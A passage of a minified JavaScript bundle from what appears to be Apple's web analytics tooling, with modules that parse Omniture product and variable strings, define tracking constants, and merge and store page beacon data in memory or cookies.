Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}exports.default=function parseProductString(productString){if(!productString||"string"!=typeof productString)return null;var _productString$split2=_slicedToArray(productString.split(_config.SEPARATORS.PRODUCT_PROPS),6),category=_productString$split2[0],sku=_productString$split2[1],qty=_productString$split2[2],price=_productString$split2[3],events=_productString$split2[4],variables=_productString$split2[5],product={category:category,sku:sku,qty:qty,price:price,events:(0,_parseEventCollectionString.default)(events,_config.SEPARATORS.PRODUCT_EVENTS),variables:(0,_parseVariableCollectionString.default)(variables)};return new _index.default(product)}},{"../../OmnitureProduct/index.js":102,"../../config.js":104,"./../parseEventCollectionString.js":106,"./../parseVariableCollectionString.js":113}],112:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _config=require("../../config.js");exports.default=function productCollectionStringToProductStringArray(productCollectionString){return productCollectionString&&"string"==typeof productCollectionString?productCollectionString.split(_config.SEPARATORS.DEFAULT).filter(Boolean).reduce((function(output,productStringCandidate){return output.length&&!productStringCandidate.includes(_config.SEPARATORS.PRODUCT_PROPS)?output[output.length-1]+=_config.SEPARATORS.DEFAULT+productStringCandidate:output.push(productStringCandidate),output}),[]):[]}},{"../../config.js":104}],113:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../OmnitureCollection/index.js")),_index2=_interopRequireDefault(require("../OmnitureVariable/index.js")),_config=require("../config.js");function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}exports.default=function parseVariableCollectionString(variablesString){var collection=new _index.default;return variablesString&&"string"==typeof variablesString?(variablesString.split(_config.SEPARATORS.PRODUCT_VARIABLES).forEach((function(variableString){var _variableString$split2=_slicedToArray(variableString.split("="),2),key=_variableString$split2[0],value=_variableString$split2[1];key&&value&&collection.add(new _index2.default(key,value))})),collection):collection}},{"../OmnitureCollection/index.js":97,"../OmnitureVariable/index.js":103,"../config.js":104}],114:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.generateProps=void 0;exports.generateProps=function generateProps(){for(var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref$keyPrefix=_ref.keyPrefix,keyPrefix=void 0===_ref$keyPrefix?"":_ref$keyPrefix,_ref$valuePrefix=_ref.valuePrefix,valuePrefix=void 0===_ref$valuePrefix?"":_ref$valuePrefix,_ref$count=_ref.count,count=void 0===_ref$count?0:_ref$count,result={},i=1;i<=count;i++)result["".concat(keyPrefix).concat(i)]="".concat(valuePrefix).concat(i);return result}},{}],115:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.VARS=exports.TRACK_LINK_ARGS=exports.PROP_MAX=exports.EVENT_MAX=exports.EVENTS=exports.EVAR_MAX=void 0;var _generateProps=require("./generateProps.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var EVAR_MAX=exports.EVAR_MAX=155,PROP_MAX=exports.PROP_MAX=75,EVENT_MAX=(exports.VARS=_objectSpread(_objectSpread({CAMPAIGN:"campaign",CHANNEL:"channel",CHAR_SET:"charSet",CITY:"city",CURRENCY_CODE:"currencyCode",EVENTS:"events",HIER1:"hier1",LINK_INTERNAL_FILTERS:"linkInternalFilters",LINK_TRACK_EVENTS:"linkTrackEvents",LINK_TRACK_VARS:"linkTrackVars",LIST_1:"list1",LIST_2:"list2",LIST_3:"list3",PAGE_NAME:"pageName",PAGE_TYPE:"pageType",PAGE_URL:"pageURL",PRODUCTS:"products",PROVINCE:"province",PURCHASE_ID:"purchaseID",REFERRER:"referrer",SERVER:"server",STATE:"state",TRACKING_SERVER:"trackingServer",TRACKING_SERVER_SECURE:"trackingServerSecure",ZIP:"zip"},(0,_generateProps.generateProps)({keyPrefix:"PROP_",valuePrefix:"prop",count:PROP_MAX})),(0,_generateProps.generateProps)({keyPrefix:"EVAR_",valuePrefix:"eVar",count:EVAR_MAX})),exports.EVENT_MAX=520),EVENTS=exports.EVENTS=(0,_generateProps.generateProps)({keyPrefix:"EVENT_",valuePrefix:"event",count:EVENT_MAX});EVENTS.SC_ADD="scAdd",EVENTS.PROD_VIEW="prodView";exports.TRACK_LINK_ARGS={ELEMENT:{DISABLE_DELAY:!0},LINK_TYPE:{DOWNLOAD:"d",EXTERNAL:"e",CUSTOM:"o"}}},{"./generateProps.js":114}],116:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loaders=void 0;var _analyticsMergeBeacons=require("@apple/analytics-merge-beacons"),_analyticsPassiveTracker=require("@apple/analytics-passive-tracker"),_index=require("./loaders/index.js");exports.loaders=function loaders(){var type=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"next",data=(0,_analyticsPassiveTracker.load)(type);return null===data?null:_index.loadersProcesses.reduce((function(result,current){var beacon=current(data);return beacon&&(0,_analyticsMergeBeacons.merge)({target:result,source:beacon}),result}),{})}},{"./loaders/index.js":117,"@apple/analytics-merge-beacons":94,"@apple/analytics-passive-tracker":126}],117:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loadersProcesses=void 0;var _loaderAPI=require("./loaderAPI.js"),_loaderBeacon=require("./loaderBeacon.js"),_loaderPageName=require("./loaderPageName.js"),_loaderArea=require("./loaderArea.js");exports.loadersProcesses=[_loaderBeacon.loaderBeacon,_loaderAPI.loaderAPI,_loaderPageName.loaderPageName,_loaderArea.loaderArea]},{"./loaderAPI.js":118,"./loaderArea.js":119,"./loaderBeacon.js":120,"./loaderPageName.js":121}],118:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loaderAPI=void 0;var _analyticsOmnitureConstants=require("@apple/analytics-omniture-constants");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.loaderAPI=function loaderAPI(){var input=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},data=Object.keys(input).reduce((function(out,key){var pageData=input[key];if(!pageData||!pageData.api)return out;var api=pageData.api,pageName="".concat("current"===key?"pageName":"c14",'+"');return out.concat(api.map((function(_ref){var type=_ref.type,value=_ref.value;return pageName+"::"+type+"::"+value})))}),[]).join('^"+');return 0===data.length?null:_defineProperty({},_analyticsOmnitureConstants.VARS.LIST_2,"D="+data+'"')}},{"@apple/analytics-omniture-constants":115}],119:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loaderArea=void 0;var _analyticsOmnitureConstants=require("@apple/analytics-omniture-constants");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.loaderArea=function loaderArea(){var previous=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).previous;if(!previous||!previous.area)return null;var area=previous.area;return _defineProperty({},_analyticsOmnitureConstants.VARS.PROP_57,area)}},{"@apple/analytics-omniture-constants":115}],120:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loaderBeacon=void 0;var _analyticsMergeBeacons=require("@apple/analytics-merge-beacons"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsOmnitureCollection=require("@apple/analytics-omniture-collection");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var parseBeacon=function parseBeacon(){var beacon=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},result=function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}({},beacon);return beacon.hasOwnProperty(_analyticsOmnitureConstants.VARS.EVENTS)&&(result[_analyticsOmnitureConstants.VARS.EVENTS]=(0,_analyticsOmnitureCollection.parseEventCollectionString)(beacon[_analyticsOmnitureConstants.VARS.EVENTS])),beacon.hasOwnProperty(_analyticsOmnitureConstants.VARS.PRODUCTS)&&(result[_analyticsOmnitureConstants.VARS.PRODUCTS]=(0,_analyticsOmnitureCollection.parseProductCollectionString)(beacon[_analyticsOmnitureConstants.VARS.PRODUCTS])),result};exports.loaderBeacon=function loaderBeacon(){var input=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_input$current=input.current,current=void 0===_input$current?{}:_input$current,_input$previous=input.previous,previous=void 0===_input$previous?{}:_input$previous;return(0,_analyticsMergeBeacons.merge)({target:parseBeacon(previous.beacon),source:parseBeacon(current.beacon)})}},{"@apple/analytics-merge-beacons":94,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115}],121:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loaderPageName=void 0;var _analyticsOmnitureConstants=require("@apple/analytics-omniture-constants");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.loaderPageName=function loaderPageName(){var previous=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).previous;if(!previous||!previous.pageName)return null;var pageName=previous.pageName;return _defineProperty({},_analyticsOmnitureConstants.VARS.PROP_14,pageName)}},{"@apple/analytics-omniture-constants":115}],122:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"append",{enumerable:!0,get:function get(){return _append.append}}),Object.defineProperty(exports,"init",{enumerable:!0,get:function get(){return _init.init}}),Object.defineProperty(exports,"load",{enumerable:!0,get:function get(){return _load.load}}),Object.defineProperty(exports,"merge",{enumerable:!0,get:function get(){return _merge.merge}}),Object.defineProperty(exports,"readDataStore",{enumerable:!0,get:function get(){return _dataStore.readDataStore}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.set}}),Object.defineProperty(exports,"triggerNewPage",{enumerable:!0,get:function get(){return _triggerNewPage.triggerNewPage}});var _init=require("./init.js"),_set=require("./set.js"),_merge=require("./merge.js"),_append=require("./append.js"),_load=require("./load.js"),_triggerNewPage=require("./triggerNewPage.js"),_dataStore=require("./dataStore.js")},{"./append.js":123,"./dataStore.js":124,"./init.js":127,"./load.js":128,"./merge.js":129,"./set.js":130,"./triggerNewPage.js":132}],123:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.append=void 0;var _error=require("./error.js"),_setDefaults=require("./setDefaults.js"),_set=require("./set.js"),_dataStore=require("./dataStore.js");exports.append=function append(key,data){var options=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};if(!key||"string"!=typeof key)throw(0,_error.error)("append","invalid key");if(data){var settings=(0,_setDefaults.setDefaults)(options),type=settings.type,original=(0,_dataStore.retrieve)({type:type,key:key});if(null!==original&&"function"!=typeof original.concat||"function"!=typeof data.concat)throw(0,_error.error)("append","cannot call append on this type of data");null!==original?(0,_dataStore.store)({type:type,key:key,data:original.concat(data)}):(0,_set.set)(key,data,settings)}}},{"./dataStore.js":124,"./error.js":125,"./set.js":130,"./setDefaults.js":131}],124:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.syncToCookie=exports.store=exports.retrieve=exports.readDataStore=exports.configure=exports.clear=void 0;var _analyticsDataMule=require("@apple/analytics-data-mule"),_setDefaults=require("./setDefaults.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var dataStore={},MULE_VERSION="v1";exports.readDataStore=function readDataStore(){var data=_objectSpread({},dataStore),page=(0,_analyticsDataMule.load)();return page&&null!==page&&(data.page=page),data},exports.configure=function configure(){var _ref$mule=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).mule,mule=void 0===_ref$mule?null:_ref$mule;null!==mule&&mule.version&&(MULE_VERSION=mule.version)},exports.store=function store(_ref2){var type=_ref2.type,key=_ref2.key,data=_ref2.data;if("page"===type){var options={version:MULE_VERSION},cookieOptions=_objectSpread(_objectSpread({},options),{},{origin:"cross"}),cookieDomain=(0,_setDefaults.getCookieDomain)();return null!==cookieDomain&&(cookieOptions.cookieDomain=cookieDomain),void(0,_analyticsDataMule.save)({data:_defineProperty({},key,data),options:options})}dataStore.hasOwnProperty(type)||(dataStore[type]={}),dataStore[type][key]=data},exports.retrieve=function retrieve(){var _ref3=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},type=_ref3.type,_ref3$key=_ref3.key,key=void 0===_ref3$key?null:_ref3$key;if("page"===type){var data=(0,_analyticsDataMule.load)();return null===data?null:null===key?data:data[key]||null}return dataStore.hasOwnProperty(type)?null===key?dataStore[type]||null:dataStore[type][key]||null:null},exports.clear=function clear(_ref4){var type=_ref4.type;if("page"===type){var cookieDomain=(0,_setDefaults.getCookieDomain)(),options={};null!==cookieDomain&&(options.cookieDomain=cookieDomain),(0,_analyticsDataMule.clearAll)(options)}dataStore[type]&&delete dataStore[type]},exports.syncToCookie=function syncToCookie(){var cookieOptions=_objectSpread(_objectSpread({},{version:MULE_VERSION}),{},{origin:"cross"}),cookieDomain=(0,_setDefaults.getCookieDomain)();null!==cookieDomain&&(cookieOptions.cookieDomain=cookieDomain),(0,_analyticsDataMule.save)({data:{},options:cookieOptions})}},{"./setDefaults.js":131,"@apple/analytics-data-mule":74}],125:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.error=void 0;exports.error=function error(){var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref$type=_ref.type,type=void 0===_ref$type?null:_ref$type,_ref$message=_ref.message,message=void 0===_ref$message?"Unknown error":_ref$message;return new Error("[PASSIVE TRACKER".concat(type?":"+type.toUpperCase():"","] ").concat(message))}},{}],126:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"append",{enumerable:!0,get:function get(){return _api.append}}),Object.defineProperty(exports,"init",{enumerable:!0,get:function get(){return _api.init}}),Object.defineProperty(exports,"load",{enumerable:!0,get:function get(){return _api.load}}),Object.defineProperty(exports,"merge",{enumerable:!0,get:function get(){return _api.merge}}),Object.defineProperty(exports,"readDataStore",{enumerable:!0,get:function get(){return _api.readDataStore}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _api.set}}),Object.defineProperty(exports,"triggerNewPage",{enumerable:!0,get:function get(){return _api.triggerNewPage}});var _api=require("./api.js")},{"./api.js":122}],127:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.init=void 0;var _analyticsDataMule=require("@apple/analytics-data-mule"),_dataStore=require("./dataStore.js"),_setDefaults=require("./setDefaults.js"),_triggerNewPage=require("./triggerNewPage.js");exports.init=function init(){var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref$muleVersion=_ref.muleVersion,muleVersion=void 0===_ref$muleVersion?null:_ref$muleVersion,_ref$cookieDomain=_ref.cookieDomain,cookieDomain=void 0===_ref$cookieDomain?null:_ref$cookieDomain;(0,_dataStore.configure)({mule:{version:muleVersion||"v1"}}),null!==cookieDomain&&(0,_setDefaults.registerCookieDomain)(cookieDomain);var packDown=(0,_analyticsDataMule.setup)();return window.addEventListener("pagehide",_triggerNewPage.triggerNewPage),window.addEventListener("beforeunload",_triggerNewPage.triggerNewPage),function(){packDown(),window.removeEventListener("pagehide",_triggerNewPage.triggerNewPage),window.removeEventListener("beforeunload",_triggerNewPage.triggerNewPage)}}},{"./dataStore.js":124,"./setDefaults.js":131,"./triggerNewPage.js":132,"@apple/analytics-data-mule":74}],128:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.load=void 0;var _dataStore=require("./dataStore.js");exports.load=function load(){var type=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"next",data={current:(0,_dataStore.retrieve)({type:"next"})};return(0,_dataStore.clear)({type:"next"}),"page"===type&&(data.previous=(0,_dataStore.retrieve)({type:"page"}),(0,_dataStore.clear)({type:"page"})),null===data.current&&delete data.current,null===data.previous&&delete data.previous,0===Object.entries(data).length?null:data}},{"./dataStore.js":124}],129:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.merge=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_error=require("./error.js"),_setDefaults=require("./setDefaults.js"),_set=require("./set.js"),_dataStore=require("./dataStore.js");function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var mergeObjects=function mergeObjects(a,b){var isBeacon=arguments.length>2&&void 0!==arguments[2]&&arguments[2],data=_objectSpread(_objectSpread({},a),b);return isBeacon&&a.hasOwnProperty("events")&&b.hasOwnProperty("events")&&(data.events=(0,_analyticsOmnitureCollection.parseEventCollectionString)(a.events).merge((0,_analyticsOmnitureCollection.parseEventCollectionString)(b.events)).toString()),isBeacon&&a.hasOwnProperty("products")&&b.hasOwnProperty("products")&&(data.products=(0,_analyticsOmnitureCollection.parseProductCollectionString)(a.products).merge((0,_analyticsOmnitureCollection.parseProductCollectionString)(b.products)).toString()),data},isObject=function isObject(item){return"object"===_typeof(item)};exports.merge=function merge(key,data){var options=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};if(!key||"string"!=typeof key)throw(0,_error.error)("merge","invalid key");if(data){var settings=(0,_setDefaults.setDefaults)(options),type=settings.type,original=(0,_dataStore.retrieve)({type:type,key:key}),isNotValidOriginal=null!==original&&!isObject(original),isNotValidData=!isObject(data);if(isNotValidOriginal||isNotValidData)throw(0,_error.error)("merge","invalid data type");null!==original?Array.isArray(original)?(0,_dataStore.store)({type:type,key:key,data:Array.from(new Set([].concat(_toConsumableArray(original),_toConsumableArray(data))))}):(0,_dataStore.store)({type:type,key:key,data:mergeObjects(original,data,"beacon"===key)}):(0,_set.set)(key,data,settings)}}},{"./dataStore.js":124,"./error.js":125,"./set.js":130,"./setDefaults.js":131,"@apple/analytics-omniture-collection":105}],130:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.set=void 0;var _error=require("./error.js"),_setDefaults2=require("./setDefaults.js"),_dataStore=require("./dataStore.js");exports.set=function set(key,data){var options=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};if(!key||"string"!=typeof key)throw(0,_error.error)("set","invalid key");if(data){var type=(0,_setDefaults2.setDefaults)(options).type;(0,_dataStore.store)({type:type,key:key,data:data})}}},{"./dataStore.js":124,"./error.js":125,"./setDefaults.js":131}],131:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 